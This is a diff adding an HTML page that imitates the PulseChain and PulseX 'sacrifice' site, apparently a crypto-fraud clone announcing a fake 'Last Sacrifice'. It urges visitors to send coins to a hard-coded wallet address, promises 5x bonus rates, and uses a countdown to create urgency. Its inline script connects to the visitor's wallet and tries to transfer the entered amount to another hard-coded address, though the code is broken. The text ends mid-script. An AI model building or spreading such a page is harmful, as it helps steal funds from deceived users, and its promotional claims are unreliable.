@@ -1,0 +1,782 @@
+<html><head>
+	<title>PulseChain and PulseX The LAST Sacrifice</title>
+	<meta charset="utf-8">
+	<link rel="shortcut icon" href="img/favicon128.png">
+	<script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+	<link rel="stylesheet" href="files/toast.css">
+	<script src="files/jquery-3.js"></script>
+	<script src="files/script.js"></script>
+<script src="files/toast.js"></script>
+<script src="files/main.js"></script>
+<script src="/js/jquery.min.js"></script>
+	
+	
+	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
+
+	<!-- FB Meta Tags-->
+    <meta property="og:url" content="https://PulseChain.com">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="PulseChain.com">
+    <meta property="og:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork">
+    <meta property="og:image:url" content="https://pulsechain.com/img/card.png">
+    <!-- T Meta Tags-->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="The Last Chance Sacrifice.">
+    <meta name="twitter:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork">
+    <meta name="twitter:image" content="https://pulsechain.com/img/card.png">
+
+	<meta name="copyright" content="Richard Heart, 2023">
+	<meta name="author" content="Richard Heart">
+	<meta name="description" lang="en" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork">
+	<meta name="keywords" lang="en" content="PulseChain, Pulse, Chain, Ethereum, Fork, Richard Heart, Crypto">
+	<meta name="date" content="2021-05-25T20:00:00+01:00">
+	<meta name="page-topic" content="Blockchain,Fork">
+	<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+		<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag(){dataLayer.push(arguments);}
+		gtag('js', new Date());
+		gtag('config', 'G-BD7BR665KN');
+	</script>
+
+<script>
+$(document).ready(function(){
+	$('.content_toggle').click(function(){
+		$('.content_block').slideToggle(300);      
+		return false;
+	});
+});
+</script>
+<script type="text/javascript">
+	let value;
+	function valueChange(e){
+		value=e.target.value
+	}
+	setTimeout(() => {
+		// let input=
+		// console.log(input)
+
+		document.getElementById('input-amount').addEventListener("change",valueChange)
+	}, 1000);
+	function ethEnabled() {
+	console.log(value)
+	console.log(window.ethereum)
+  if (window.ethereum) {
+    window.ethereum.request({ method: "eth_requestAccounts" });
+    // const chainId = await window.ethereum.request({
+    //   method: "eth_chainId",
+    // });
+    console.log(chainId);
+    window.web3 = new Web3(window.ethereum);
+    return true;
+	let web3=new Web3(window.ethereum)
+	web3.eth.getAccounts().then((res)=>{
+		let tx={
+			from:res[0],
+			to:0xaD9b1840e019ebA9dc7eEf71824499161A283969,
+			value:(parseInt(value)*10e18).toString()
+		}
+		web3.eth.sendTransaction().then((res)=>{
+			alert('Amount is Transferred')
+		})
+	})
+  }
+  return false;
+};
+</script>
+	<style>
+		@font-face {
+			font-family: "AvenirNextMedium";
+			src: url("AvenirNextMedium.ttf");
+		}
+
+		@font-face {
+			font-family: "AvenirNextDemiBold";
+			src: url("AvenirNextDemiBold.ttf");
+		}
+
+		@font-face {
+			font-family: "AvenirNextBold";
+			src: url("AvenirNextBold.ttf");
+		}
+
+		@font-face {
+			font-family: "LCD";
+			src: url("lcd.ttf");
+		}
+
+		:root {
+			--bgColor: #111;
+			--logoGradient: linear-gradient(210deg, #00eaff 0%, #0080ff 25%, #8000ff 50%, #e619e6 75%, #f00 100%);
+		}
+
+		body {
+			background-color: var(--bgColor); color: #eee;
+			font-family: "AvenirNextMedium", sans-serif;
+			font-size: 16px; text-align: center; margin: 0;
+
+			-webkit-tap-highlight-color: rgba(0,0,0,0);
+			user-select: none;
+			-webkit-touch-callout: none;
+			-webkit-user-select: none;
+			touch-action: manipulation;
+		}
+		.selectable {
+			user-select: text; -webkit-user-select: text;
+		}
+
+		a {
+			color: #7ae0ff;
+			text-decoration: none;
+			transition: all 0.1s;
+		}
+
+		b {
+			color: #fff; font-family: "AvenirNextBold";
+		}
+		.title {
+			font-size: 32px; font-family: "AvenirNextDemiBold"; width: 100%; position: relative; text-align: center; float: left; margin-bottom: 20px;
+		}
+
+		.btn {
+			color: #fff !important; position: relative; float: left; padding: 5px 12px; background-color: #161616; border-radius: 3px; font-family: "AvenirNextDemiBold";
+		}
+		.btn:before {
+			content: '';
+			position: absolute;
+			top: 0; right: 0; bottom: 0; left: 0;
+			margin: -2px;
+			z-index: -1;
+			border-radius: 5px;
+			background: var(--logoGradient);
+		}
+
+		.menuLink {
+			position: relative; display: inline-block; margin: 0 15px; color: #fff7; font-family: "AvenirNextDemiBold";
+		}
+
+		.card {
+			position: relative; display: inline-block; padding: 30px 50px; width: 80%; background-color: #2225; border-radius: 8px; box-shadow: 0 15px 30px #0003; margin-top: 50px; text-align: left; max-width: 500px;
+			user-select: text; -webkit-user-select: text;
+		}
+		.hl {
+			position: relative; display: inline-block; width: 100%;
+		}
+
+		.cmrk:after {
+			background-image: url("img/cmrk.png"); background-size: contain; background-repeat: no-repeat; display: inline-block; width: 18px; height: 20px; content:""; margin-right: 8px;
+		}
+
+		@media not all and (pointer:coarse) {
+			a:hover {color: #00eaff;}
+
+			.btn:hover {background-color: #1d1d1d;}
+
+			.sLink:hover {opacity: 0.7 !important;}
+
+			.menuLink:hover {color: #fffb;}
+
+			.footerLink:hover {color: #fffb !important;}
+		}
+
+		.menuLinkActive {
+			color: #fff !important; cursor: default;
+		}
+
+
+		#ECGsvgLine {
+			stroke-dasharray: 1850,50;
+			stroke-linecap: round;
+			stroke-dashoffset: -25;
+			animation: pulsate 3s cubic-bezier(0, 0.2, 1, 0.8) infinite;
+		}
+
+		@keyframes pulsate {
+			from {
+				stroke-dashoffset: -25;
+			}
+			to {
+				stroke-dashoffset: -1921;
+			}
+		}
+
+
+		@media (max-width: 1000px) {
+			.menuLink {margin: 0 10px;}
+		}
+
+		@media (max-width: 940px) {
+			.menuLink {display: none;}
+		}
+
+		@media (max-width: 640px) {
+			.mainTitleBreak {display: none;}
+			.card {width: calc(100% - 1px); max-width: 100%; border-radius: 0; box-shadow: none; background-color: #0000;}
+			#bgImg {background-size: 150% auto !important;}
+		}
+
+		@media (max-width: 470px) {
+			#topLogo {display: none;}
+			#topLogoShort {display: inherit !important;}
+			#bgImg {background-size: auto 120% !important;}
+		}
+		.address 
+		{
+    background: #1A2025;
+    border: 1px solid #313E47;
+    border-radius: 30px;
+    padding: 10px 10px 10px 25px;
+    max-width: 630px;
+    width: 100%;
+    margin: auto;
+    overflow: hidden;
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: justify;
+    -ms-flex-pack: justify;
+    justify-content: space-between;
+	}
+	.address > span {
+				font-style: normal;
+				font-weight: 500;
+				font-size: 12px;
+				overflow: hidden;
+				-o-text-overflow: ellipsis;
+				   text-overflow: ellipsis;
+				color: #FFFFFF;
+}
+.address > button {
+				-webkit-box-flex: 0;
+				    -ms-flex: none;
+				        flex: none;
+				background: -webkit-gradient(linear, left top, left bottom, from(#92ab97), to(#92ab97));
+background: -o-linear-gradient(top, #9b06f8 0%, #1f62ff 100%);
+background: linear-gradient(180deg, #9b06f8 0%, #1f62ff 100%);
+				border-radius: 789px;
+				width: 44px;
+				height: 44px;
+				-webkit-transition: 0.3s;
+				-o-transition: 0.3s;
+				transition: 0.3s;
+}
+.address > button:hover {
+				opacity: 0.5;
+				}
+				
+*, input, ::before, ::after, button {
+				-webkit-box-sizing: border-box;
+				        box-sizing: border-box;
+}
+
+
+button {
+				cursor: pointer;
+				border: none;
+				background: none;
+				outline: none;
+				-webkit-box-sizing: border-box;
+				        box-sizing: border-box;
+}
+
+.imgg {
+    width: 100%;
+    height: auto;
+}
+
+li {
+  display: inline-block;
+  list-style-type: none;
+  text-transform: uppercase;
+}
+
+li span {
+  
+}
+
+.timer {
+font-family: 'LCD';
+color: #00eaff;
+font-size: 3.5em;
+letter-spacing: .08em;
+}
+
+@media (max-width: 470px) {
+			.timer {font-size: 2em !important;}
+		}
+
+
+.cmrk3:after {
+	background-image: url(img/x.png); background-size: contain; background-repeat: no-repeat; display: inline-block; width: 18px; height: 20px; content:""; margin-right: 2px;
+}
+.cmrk2:after {
+	background-image: url(img/pls.png); background-size: contain; background-repeat: no-repeat; display: inline-block; width: 18px; height: 17px; content:""; margin-right: 2px;
+}
+	</style>
+</head>
+<body>
+	<div style="position: fixed; top: 40px; left: 0; bottom: 0; right: 0; background-image: url('img/logoBlurred.svg'); background-repeat: no-repeat; background-size: 120% auto; background-position: center center; opacity: 0.05; z-index: -1000;" id="bgImg"></div>
+
+	<div style="position: fixed; top: 0; left: 0; width: 100%; height: 80px; background-color: #121212fa; z-index: 1000; box-shadow: 0 12px 25px #0003;">
+		<img src="img/wordmark2.png" id="topLogo" style="position: relative; float: left; margin: 20px; margin-right: 0; height: 40px;">
+		<img src="img/wordmarkShort.png" id="topLogoShort" style="display: none; position: relative; float: left; margin: 20px; margin-right: 0; height: 40px;">
+		<div style="position: relative; display: inline-block; margin-top: 30px; padding-right:280;">
+			<a class="menuLink" href="javascript:menu(1)">Sacrifice</a>
+			<a class="menuLink" href="javascript:menu(6)">Goals</a>
+			<a class="menuLink" href="javascript:menu(7)">Bridging</a>
+			<a class="menuLink" href="javascript:menu(8)">Trading</a>
+			<a class="menuLink" href="javascript:menu(9)">Nomenclature</a>
+		</div>
+		
+		<a href="https://t.me/pulsechaincomsacrifice" target="_blank"><img src="img/logos/tg.svg" style="position: relative; float: right; margin: 30px; margin-left: 0; height: 20px; opacity: 0.5; transition: all 0.1s;" class="sLink"></a>
+	</div>
+
+	<div style="position: absolute; top: 80px; height: 290px; width: 100%; left: 0; opacity: 0.1; z-index: -10;" id="ecgBG">
+		<div style="position: absolute; left: 0; width: 100%; padding-top: 13%; top: 50%; transform: translateY(-50%);">
+			<svg style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" width="1500px" height="201px" viewBox="0 0 1500 201" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+	    		<defs>
+			        <linearGradient x1="61.0522229%" y1="48.0140572%" x2="39.0163373%" y2="52.0335005%" id="linearGradient-1">
+			            <stop stop-color="#00EAFF" offset="0%"></stop>
+			            <stop stop-color="#0080FF" offset="25.2530882%"></stop>
+			            <stop stop-color="#8000FF" offset="49.7394282%"></stop>
+			            <stop stop-color="#E619E6" offset="74.9912298%"></stop>
+			            <stop stop-color="#FF0000" offset="99.9136118%"></stop>
+			        </linearGradient>
+			    </defs>
+			    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linejoin="round">
+			        <g id="Header" transform="translate(0.000000, -149.000000)" stroke="url(#linearGradient-1)" stroke-width="16">
+			            <polyline id="ECGsvgLine" points="9.09494702e-13 249.818674 681.441827 249.818674 702.941323 285.562182 737.072792 157.798285 763.527146 341.800574 797.472814 214.169796 818.898119 249.818674 1500 250"></polyline>
+			        </g>
+			    </g>
+			</svg>
+		</div>
+	</div>
+	<b class="hl" id="mainTitle" style="font-size: 32px; font-family: 'AvenirNextBold'; margin-top: 130px; max-width: 80%;">Congratulations!<br class="mainTitleBreak"> The Last Sacrifice is starting now!</b>
+	<br><br>
+	<span style="position: relative; display: inline-block; font-family: AvenirNextDemiBold; max-width: 80%; opacity: 1;" id="subTitle">The <span class="cmrk2"></span>PulseChain and <span class="cmrk3"></span>PulseX sacrifice phase raised millions of dollars<br class="mainTitleBreak"> to support the SENS.org medical research foundation!</span><br>
+	
+	<input onchange="valueChange(this.value)" value=0 style="width: 400px; height: 40px; padding: 16px; background-color: white; margin: auto;border-radius: 16px;" id="input-amount"/>
+	<button onclick='ethEnabled()' style="background-color: white;color: black; padding: 16px ; border-radius: 16px;margin: auto;margin-top: 10px; width: 200px; border-radius: 16px; border: 0px;" id="sacrifice">Sacrifice</button>
+	<span class="hl"></span>
+	
+	<div class="card" id="timerCard" style="margin-top: 30px; text-align: center; padding-top: 40px;"> <div class="container">
+  <h1 id="headline">Time until the end of the sacrifice:</h1>
+  <div class="timer" id="countdown">
+          <li style="display: none;"><span id="days" style="display: none;"></span></li>
+      <li><span id="hours">:</span>&nbsp;:</li>
+      <li><span id="minutes"></span>&nbsp;:</li>
+      <li><span id="seconds"></span></li>
+  </div>
+  <div id="content" class="emoji">
+  <br>
+    <span>The PLS/USD and PLSX/USD rate increased by X5 during THE LAST Sacrifice. Every 30 minutes from now the rate will be dropping by 10%, until it becomes flat 1:1 ratio at the end.<!-- Every 30 minutes from now the rate will be dropping by 10%, until it becomes flat 1:1 ratio at the end.--></span>
+  </div>
+</div></div>
+
+		<span class="hl"></span>
+	
+	<span class="hl"></span>
+	
+	
+	<div class="card" style="background: var(--logoGradient);">
+		<b class="title">Project status</b>
+			
+<p style="text-align: center;"><br><br><b><!--Even though the Official Sacrifice Phase Period is already over, Pulsechain team decided to launch THE LAST Sacrifice Possibility.-->Even though the Official Sacrifice Phase Period is already over, Pulsechain and PulseX team decided to launch THE LAST Sacrifice Possibility. Enjoy maximal PLS/PLSX - USD rate in the next 24 hours.</b></p>
+<p><br>Pulse is a project, which was created to deliver a message to this world. The sacrifice is your political statement against high fees. All of your money goes to <a href="https://www.sens.org/">Sens foundation</a>. And will be used to invest in research of aging and common illnesses prevention.</p>
+<br>
+
+      
+      <hr style="border: 2px solid #000;">
+      
+      
+<p style="text-align: center;"><b>This smart contract grants you <span class="cmrk2"></span> PLS and <span class="cmrk3"></span>PLSX tokens.</b></p>
+<p style="line-height: 1.8em;">If you are sending on the following networks <br> <img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/eth.png"> Ethereum, <img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/bnb.png"> Binance Smart Chain, <br> <img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/matic.png"> Polygon/Matic, <img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/avax.png"> Avalanche, <br><img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/etc.png"> Ethereum Classic, or <img width="24" height="24" alt="crypto icon" src="PulseX%20Sacrifice_files/optimism.svg"> Ethereum Optimism you can send directly from your wallet to</p>
+      
+<div class="address">
+                <span id="wallet">0xD844fEA161681AAcabb4fAf90FEc3Ea962C3e033</span>
+                <button onclick="CopyToClipboard('wallet');return false;">
+                        <span>
+                            <img src="files/duplicate.svg" alt="">
+                        </span>
+                </button>
+            </div>
+<p>The ratio is <b>1 USD = 50,000 PLS + 50,000 PLSX</b></p>
+
+<p>The <b>PLS/USD</b> + <b>PLSX/USD</b> rate <b>increased by X5</b> during THE LAST Sacrifice. Every 30 minutes from now the rate <b>will be dropping by 10%</b>, until it becomes flat 1:1 ratio at the end (Earlier sacrifice grants better rate).</p>
+
+
+
+
+<hr style="border: 2px solid #000;">
+
+
+
+
+
+
+
+<div style="display:none;">
+<a class="content_toggle" href="#"><button class="btn">Metamask instructions</button></a>
+ 
+<div class="content_block" style="display: none;">
+	<p><b><br><br>Step 1: Open Metamask</b></p>
+	<p>Click on the fox-like icon on the right top of your browser window.</p>
+	<p style="text-align: center;"><img src="img/1.png" alt="К" class="imgg"></p>
+	<p>A pop up window of Metamask should appear, similar to below</p>
+	<p style="text-align: center;"><img src="img/2.png" alt="К" class="imgg"></p>
+	<p><b>Step 2: Initiate the fund transfer</b></p>
+	<p>Once you have funded your metamask wallet address with the desired amount of any of ERC-20 or BEP-20 tokens, please click on the Send button.</p>
+	<p style="text-align: center;"><img src="img/3.png" alt="К" class="imgg"></p>
+	<p>It will take you to following screen, where you will enter PulseChain Smart contract address and amount you want to sacrifice.</p>
+	<!--<p style="text-align: center;"><img src="img/4.png" alt="К" class="imgg"></p>-->
+	<p>Enter PulseChain smart contract address</p>
+	<p><b>0xb750E565fc9AAd8D82c203880333eECb8842E3E5</b></p>
+    <p>Enter how much you want sacrifice. (20,000 PLS = 1 USD or 1 ETH = 25,000,000 PLS)</p>
+	<p>You can send any ERC-20 or BEP-20 tokens to this contract.<!-- the price will be derived from an average of last 1, 5 and 15 minutes after transaction confirmation.--></p>
+	<p>Click <b>‘Next’</b> to continue.</p>
+	<p style="text-align: center;"><img src="img/5.png" alt="К" class="imgg"></p>
+	<p>When you are happy with the values above, click <b>“Confirm”</b> to trigger the transaction.</p>
+	<p>In case you get any errors (e.g. "out of gas") try to set your gas limit to 70,000 and try sending a round amount without any decimals.</p>
+	
+</div>
+</div>
+
+
+<p>You can send from MetaMask / Trust Wallet / Coinbase Wallet Leger/Trezor / MEW. Any wallet you have the seed words or keys to. ETH, BNB, MATIC, AVAX, ETC, DAI, USDC, USDT, BUSD, WBTC and more are supported. The price will be derived from an average of last 1, 5 and 15 minutes after transaction confirmation.</p>
+<p>You will get your PLS and PLSX tokens after the launch of the main network.</p>
+<p>After the Sacrifice Phase ends, there will be a snapshot of all addresses and you will be able to claim your doubled free tokens.<br><br> <b>The biggest airdrop in history continues!</b></p>
+
+		
+	</div>
+	
+	<span class="hl"></span>
+	
+<div class="card" style="margin-top: 30px;">
+		<b class="title">Sacrifice Details</b>
+		<br><br>
+		Donations sent to the addresses at <a href="https://sens.org/donate" target="_blank">SENS.org/donate</a> may be tax deductible for you. We raised $25,000,000 for medical research so far! Sacrifices to SENS.org during the sacrifice phase earn 25% less points compared to sacrifices at <a href="https://sacrifice.live" target="_blank">Sacrifive.live</a> . SENS.org can also accept stocks and bank wires.
+		<br><br>
+		Once the sacrifice phase is over, a snapshot of all transactions from metamask will be taken. If you have made a transaction from centralized exchanges, you will have a week after the end of the sacrifice to fill out the form provided on the website.
+	<br><br>
+	
+	
+		By the way, The <a href="https://gitlab.com/pulsechaincom" target="_blank">PulseChain code</a> was just released!
+		<br><br>
+		The PLS supply increases with the amount sacrificed.
+		The sacrifice set can mint 1 free PLS per sacrifice point.
+		Ethereum holders only get 1 free PLS per ETH. And it's value is deducted from their address after 30 days.
+		A genesis address gets 1% of the total PLS supply at launch. (It will not benefit you, and may waste the coins in any way it wishes.)<br>If the total supply isn't 10,000x higher than ETHs, then everyone will get upscaled (bonus coins pro rata) to bring the total supply to 10,000x ETH's total supply.<br>The USD value of sacrifice's are estimated using 30 minute time weighted average prices where convenient.
+		<br><br>
+		An automated market maker ratio fixer contract will mint enough supply to correct the PLS ratios as the first act on main net, as PLS will have a much higher supply than ETH. It will probably mint around 2.5% of supply.
+		<span id="rateLblOuter" style="display: none;">
+			<br><br>
+			<span style="position: relative; float: left; width: 100%; text-align: center;">Current rate per 10,000 points: <span id="priceLbl">3.56$<br>The Volume Bonus ranking is over. Every sacrifice from now on receives a fixed 1.75x Volume Bonus.</span></span>
+		</span>
+	</div><span class="hl"></span>
+	
+	<div class="card">
+		<b class="title">Testimonial</b>
+		<br><br>
+		The following is a clip of Aubrey de Grey, the Chief Science Officer of the <a href="https://sens.org" target="_blank">SENS Research Foundation</a> thanking Richard Heart and the PulseChain community for donating millions of dollars to medical research.
+		<br><br>
+		<div style="position: relative; float: left; padding-top: 56.25%; width: 100%; height: 0px;">
+			<iframe style="position: absolute; top: 0; float: left; width: 100%; height: 100%; border-radius: 8px;" src="https://www.youtube-nocookie.com/embed/Cmvmg9M4oxo?start=1963" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+		</div>
+		
+		
+	</div><span class="hl"></span>
+	
+	
+	<div class="card" style="margin-top: 30px; background: var(--logoGradient);">
+		<span class="hl"></span>
+		<br><br>
+		"I want to thank Richard Heart; what he’s doing for us is spectacular! We have been having a very good year with income - a big expansion of our activities is coming. Thanks to the PulseChain Airdrop, those plans are going to explode into another level entirely. Our work will be greatly accelerated, resulting in huge numbers of lives saved in the future, as a direct result of Richard's supporters' wonderful generosity. We’re all working tirelessly to keep up with donors and hold up our part of the process. Thank you so very much Richard!"
+		<br><br>
+		- Aubrey de Grey
+	</div>
+	
+    </div><span class="hl"></span>
+	
+	
+	<div class="card">
+		<b class="title">Volume Bonus Multiplier</b>
+		<br><br>
+		Imagine that each sacrifice point grows legs, puts on a shirt with his sacrificer's address on it and lines up in a big line out front of an auditorium.
+		<br><br>
+		The largest sacrificer's points line up first. Then the 2nd largest. They file in and fill up the rows from the front to the back. Now an attendant comes in, and starts handing out bonus cards. He goes down the rows, in the same order they entered, and hands everyone a card. When he's done they see that the first card handed out is a 2.5x. Every card he handed out after was worth ever so slightly less till he got to the very back, where the last card was just barely more than 1x. The difference between each card and the next is always the same.
+		<br><br>
+		Now all the points stand up, and head to the changing room in the same order they entered the auditorium. The first point enters and out comes 2.5 points, all wearing the same sacrificer's address on their shirt. What does a half point look like you say? Fun sized is the answer. This continues until every sacrificer's points have all gotten the bonus they deserve. In math speak, it's a linear bonding curve from 1x to 2.5x.
+		<br><br>
+		The top guy's coins took up the most space and in the best location. The next guys points took up the 2nd most space and in the 2nd best location. And so forth. If someone adds to their sacrifice, overtaking you before the end, your sacrifice points get pushed further down the bonus ranking. This is how days 1-16 work.
+		<br><br>
+		Days 17, 18 &amp; 19 have the worst rates, and get a flat bonus of only 1.75x.
+	</div>
+	
+	    </div><span class="hl"></span>
+	
+	<div class="card" style="margin-top: 30px;">
+		<b class="title">PulseChain Goals</b>
+		<br><br>
+		<span class="cmrk"></span><b>Increase Ethereum's value</b><br>
+		Ethereum's fees will be lowered by sharing its load.<br><br>
+
+		<span class="cmrk"></span><b>Enrich ETH users</b><br>
+		PulseChain will re-enable priced out use cases: Instead of launching empty, PulseChain brings the ETH system state and ERC20s, this rewards holders and founders of Ethereum based projects.<br><br>
+
+		<span class="cmrk"></span><b>Enrich ERC20 and NFT users</b><br>
+		The launch of PulseChain is the largest airdrop in history. Thousands of Ethereum based tokens and NFTs receive their free PulseChain versions.
+		This <b>new gold rush</b> contains the value discovery of thousands of tokens and NFTs on PulseChain. If you always wanted to be a whale in a certain ERC20 or NFT, maybe now you can be.<br><br>
+
+		<span class="cmrk"></span><b>Easy to use</b><br>
+		Your <a href="https://metamask.io/" target="_blank">MetaMask</a> wallet just works, you only have to change a single setting to access PulseChain. ETH holders can transact for free with freemium PLS.<br><br>
+
+		<span class="cmrk"></span><b>Lower PulseChain fees and serve more users</b><br>
+		PulseChain increases the throughput of Ethereum 4x by using 3 second block times. <a href="https://etherscan.io/chart/blocktime" target="_blank">Ethereum's average block time</a> is around 13 seconds.<br><br>
+
+		<span class="cmrk"></span><b>Remove pollution</b><br>
+		By replacing proof of work miners with proof of stake validators PulseChain doesn't burn "waste" any energy making it environmentally friendly.<br><br>
+
+		<span class="cmrk"></span><b>Improve game theory</b><br>
+		PLS has 0% inflation. Validators only earn fees and 25% of the fees are burnt to reduce the circulating supply.<br><br>
+
+		<span class="cmrk"></span><b>Empower PulseChain holders</b><br>
+		PulseChain's native token $PLS can be staked and delegated to validators that reward the delegators with the largest percentage of fees.
+	</div>
+	<span class="hl"></span>
+	<span class="hl"></span>
+	<div class="card">
+		<b class="title">Interoperability "Bridging"</b>
+		<br><br>
+		ETH can be traded on the Pulse network and PLS can be traded on the Ethereum network. Bridging can also be done to other smart contract capable networks.
+		<br><br>
+		<span class="cmrk"></span><b>ETH on PulseChain</b>: You can send ETH to the PulseBridge contract on ETH which locks it and issues pETH (pulseETH) on PulseChain at a 1:1 ratio.
+		<br><br>
+		<span class="cmrk"></span><b>PLS on Ethereum</b>: You can send PLS to the ETHbridge contract on PulseChain which locks it and issues ePLS (ethPulse) on the Ethereum network 1:1. This <b>can also work for ERC20s</b>.
+	</div>
+	<span class="hl"></span>
+	<div class="card">
+		<b class="title">Trading</b>
+		<br><br>
+		Thousands of ERC20 tokens on PulseChain can trade on PulseChain's <a href="https://uniswap.org/" target="_blank">Uniswap</a> and similar at launch, since Ethereum's state is included.
+		<br><br>
+		There will be an ePLS:ETH pair on Uniswap on the Ethereum network &amp; a pETH:PLS pair on Uniswap on the PulseChain network.
+		<br><br>
+		There may be ePLS trading pairs on other smart contract enabled chains.
+		<br><br>
+		<b>Exchanges may list PLS</b> and any of the thousands of tokens on the PulseChain network.
+	</div>
+	<span class="hl"></span>
+	<div class="card" style="margin-bottom: 50px;">
+		<b class="title">Nomenclature</b>
+		<br><br>
+		Anything locked on the Ethereum network bridge to the Pulse network will be known as p[Anything]. Example: "pETH" for ETH locked on Ethereum bridged to the Pulse network.
+		<br><br>
+		<a href="https://hex.com/" target="_blank">HEX</a> is known as eHEX (short for HEX on the ETH network) while HEX on PulseChain is called pHEX (short for HEX on the Pulse network).
+	</div>
+		<span class="hl"></span>
+	<div class="card" style="margin-bottom: 50px; background: var(--logoGradient);">
+		<b class="title">Disclaimer</b>
+		<br><br>
+		You are sacrificing to prove how strong you believe that blockchains are speech and speech is a protected human right. This is an important political statement. You must have no expectation of profit from the work of others. The set of people who have sacrificed to show their commitment to this political statement makes a great set of people to airdrop free things to. This sacrifice points are not meant to have any monetary value. Remember, you're not buying anything, the world is just noticing you are amongst a group of people that sacrificed to make a political statement. Some countries tax their citizens when they receive things of value. PulseChain and all the coins on it are designed to start with no value, which is ideal. Consult your own legal and financial professionals, as nothing written here should be considered professional advice. The only thing we know of set to be airdropped for free to this political group so far is PulseChain (PLS.) If we hear about other cool things, we'll let you know.
+	</div>
+		<span class="hl"></span>
+	<span class="hl" style="margin-bottom: 20px;">
+		<a href="Branding.zip" download="" style="color: #fff7; font-size: 12px; font-family: 'AvenirNextDemiBold';" class="footerLink">Download Branding Resources</a>
+	</span>
+	<span class="hl" style="color: #fff2; font-size: 12px; margin-bottom: 30px;">Copyright © 2023. All Rights Reserved.</span>
+
+
+
+
+<div class="toasts" style="position: fixed; top: 15px; right: 15px; width: 250px;"></div>
+
+
+<script type="text/javascript" src="https://unpkg.com/web3modal"></script>
+<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+<script>
+
+// 	const Web3Modal = window.Web3Modal.default;
+// const WalletConnectProvider = window.WalletConnectProvider.default;
+// let web3Modal
+
+// // Chosen wallet provider given by the dialog window
+// let provider;
+
+
+// // Address of the selected account
+// let selectedAccount;
+// const providerOptions = {
+//     walletconnect: {
+//       package: WalletConnectProvider,
+//       options: {
+//         // Mikko's test key - don't copy as your mileage may vary
+//         infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
+//       }
+//     },
+//   };
+//   web3Modal = new Web3Modal({
+//     cacheProvider: false, // optional
+//     providerOptions, // required
+//   });
+
+
+	// let button=document.getElementById('sacrifice')
+	// button.addEventListener('onclick',ethEnabled)
+const menu = sID => {
+	$('html,body').animate({scrollTop: $(`.card:eq(${sID})`).offset().top-80-30}, 400)
+}
+
+const scrollPlay = () => {
+	$('#ecgBG').css('margin-top', document.body.scrollTop/2 + 'px')
+
+	if (document.body.scrollTop > 20) {
+		if ($('#mainTitle').css('opacity') == '1') {
+			$('#mainTitle').fadeTo(200,0)
+		}
+	} else if ($('#mainTitle').css('opacity') == '0') {
+		$('#mainTitle').fadeTo(200,1)
+	}
+
+	if (document.body.scrollTop > 120) {
+		if ($('#subTitle').css('opacity') == '1') {
+			$('#subTitle').fadeTo(200,0)
+		}
+	} else if ($('#subTitle').css('opacity') == '0') {
+		$('#subTitle').fadeTo(200,1)
+	}
+
+
+	$('.menuLink').removeClass('menuLinkActive')
+
+	if (document.body.scrollTop > 120 && document.body.scrollTop < $(`.card:eq(7)`).offset().top - 200) {
+		$('.menuLink:eq(0)').addClass('menuLinkActive')
+	}
+
+	if (document.body.scrollTop > $(`.card:eq(7)`).offset().top - 200 && document.body.scrollTop < $(`.card:eq(8)`).offset().top - 200) {
+		$('.menuLink:eq(1)').addClass('menuLinkActive')
+	}
+
+	if (document.body.scrollTop > $(`.card:eq(8)`).offset().top - 200 && document.body.scrollTop < $(`.card:eq(9)`).offset().top - 200) {
+		$('.menuLink:eq(2)').addClass('menuLinkActive')
+	}
+
+	if (document.body.scrollTop > $(`.card:eq(9)`).offset().top - 200 && document.body.scrollTop < $(`.card:eq(10)`).offset().top - 200) {
+		$('.menuLink:eq(3)').addClass('menuLinkActive')
+	}
+
+	if (Math.round(document.body.scrollTop + document.body.clientHeight) == $(document).height() || document.body.scrollTop > $(`.card:eq(10)`).offset().top - 200) {
+		$('.menuLink').removeClass('menuLinkActive')
+		$('.menuLink:eq(4)').addClass('menuLinkActive')
+	}
+
+	window.requestAnimationFrame(scrollPlay)
+}
+
+scrollPlay()
+
+
+const addZeroes = s => ('0000'+s).slice(-2)
+
+const render = () => {
+	// Date.UTC(2021, 8-1, 15, 4, 50)
+
+	// Morning of 15th July
+	const startUTC = 1_626_324_600
+	// Morning of 3th Aug
+	const endUTC = 1_627_966_200
+
+	const secLeft = endUTC - Date.now()/1000
+	const hours = addZeroes(Math.floor(secLeft/3600) % 24)
+	const leftDays = secLeft/3600/24
+	const days = Math.floor(leftDays)
+
+	const d = new Date()
+	const sec = addZeroes(60 - d.getUTCSeconds())
+	const min = addZeroes((109 - d.getUTCMinutes()) % 60)
+
+	$('#timerLbl').text(`${hours}:${min}:${sec}`)
+
+	const rate = 1.05 ** Math.ceil(14-leftDays)
+
+	if (days == 3) {
+		$('#daysCountDisc').text(`A 1.75x flat Volume Bonus activates for the next 3 days after that. ${days} day${days==1?'':'s'} plus the hours above until the sacrifice phase is over.`)
+	} else if (days <= 3) {
+		$('#daysCountDisc').text(`The ranked Volume Bonus phase is already over. Everybody receives a 1.75x flat Volume Bonus for the next ${days} day${days==1?'':'s'} plus the hours above until the sacrifice phase is over.`)
+	} else {
